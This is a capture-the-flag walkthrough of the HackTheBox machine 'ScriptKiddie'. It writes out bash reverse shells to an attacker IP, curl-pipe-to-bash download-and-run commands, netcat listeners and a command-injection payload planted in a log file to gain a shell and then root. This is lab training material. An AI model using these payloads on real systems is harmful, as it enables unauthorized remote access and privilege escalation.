# ScriptKiddie

## Information Gathering

### General Information
10.10.10.226<br>
ScriptKiddie<br>

### Versions
- OpenSSH 8.2p1
- Werkzeug httpd 0.16.1 (Python 3.8.5)

### Outstanding Observations


## Scanning
Start with a basic nmap scan:
```bash
# Nmap 7.92 scan initiated Mon Apr  4 13:20:51 2022 as: nmap -sC -sV -oN nmap/kiddie.nmap 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  4 13:21:00 2022 -- 1 IP address (1 host up) scanned in 9.13 seconds

```
Running a Nikto and Gobuster scan does not yield anything. Possibly because Werkzeug is a type of Web API.<br>

## Exploitation
Navigating to this page shows the use of three tools: nmap, msfvenom, searchsploit all from the web application. Attempting some command injections doesn't get anywhere. Because these tools are front facing we may be able to exploit vulnerabilities to these applications from the website. Doing a bit of research shows <a href="https://www.exploit-db.com/exploits/49491">this</a> exploit for msfvenom.<br>
I try to modify this exploit to run <b>bash -i >& /dev/tcp/10.10.14.15/1337 0>&1</b> but continue to get an error. Inputting some random payload like 'test' does not cause this error. Trying to put a cURL command into the payload field does not generate any errors. Thus, the attack chain is this:<br><br>
Write the command I want to inject into the server into a file
```bash
bash -i >& /dev/tcp/10.10.14.15/1337 0>&1
```
Within the python script write ```curl http://10.10.14.15:8080/shell.sh | bash``` and run the script to generate the payload.<br>
Spin up the web server you are going to download the script from: ```python3 -m http.server 8080```<br>
Lastly, start the reverse shell: ```nc -lnvp 1337```<br>
Upload the file and you will catch a reverse shell as the <b>kid</b> user.

## Privilege Escalation

### Pivoting to pwn
Taking a look around, there appears to be two active users on this machine: kid and pwn. The pwn user seem to be running a shell script, /home/pwn/scanlosers.sh which reads from a file /home/kid/logs/hackers.
```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
This shell script runs a nmap scan against any ip address logged in the hackers file. Looking at the code in /home/kid/html/app.py shows that an ip address from the web application gets logged everytime someone attempts an OS command injection. We can avoid this step as kid can write directly to the <b>hackers</b> file.<br>
We can inject an OS command into this shell script in order to pivot over to the pwn user. I fiddled around for a while but found a payload which elevates privileges:
```bash
127.0.0.1 ; $(curl http://10.10.14.15:8080/pwn.sh | bash)
```
Performing the same steps as getting foothold allows you to pivot over to the pwn user.<br>
Write a shell script to toss the reverse shell ```bash -i >& /dev/tcp/10.10.14.15/9999 0>&1```<br>
Start a reverse shell ```nc -lnvp 9999```<br>
Start a web server to download the shell script ```python3 -m http.server 8080```<br>
Lastly, inject and save the command to the hackers file. This should immedeiatly catch a shell to the pwn user.

### Getting root
Looking to see if pwn can perform sudo without any passwords shows:
```bash
$ sudo -l

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```
Running ```sudo msfconsole``` allows us to run system commands within msfconsole as root.
```bash
msf6 > cat /root/root.txt
[*] exec: cat /root/root.txt

[FLAG]
```